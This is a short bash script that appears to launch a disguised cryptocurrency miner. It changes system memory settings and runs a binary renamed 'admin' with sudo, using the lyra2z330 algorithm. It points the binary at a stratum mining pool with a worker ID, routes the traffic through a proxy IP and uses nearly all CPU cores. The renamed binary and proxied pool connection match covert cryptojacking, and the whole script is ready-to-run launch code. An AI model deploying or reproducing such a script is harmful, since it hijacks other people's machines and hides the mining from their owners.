#!/bin/bash
echo "vm.nr_hugepages=128" >> /etc/sysctl.conf && sysctl -p
cd /usr/share/work/
echo "admin is starting"
cpucores=$( awk -F: '/model name/ {core++} END {print core}' /proc/cpuinfo )
if [ $cpucores -ge 16 ]; then
downcore=2;
else 
downcore=1;
fi
if [ $cpucores -ge 2 ]; then
detectcpu=$[$cpucores - $downcore]
else 
detectcpu=$cpucores
fi
maxcore=$[$cpucores - $downcore];
sudo ./admin -a lyra2z330 -o stratum+tcp://hxx-pool2.chainsilo.com:3033 -u nvt191655320.1 -p x -x 18.207.224.76:808 -t $maxcore
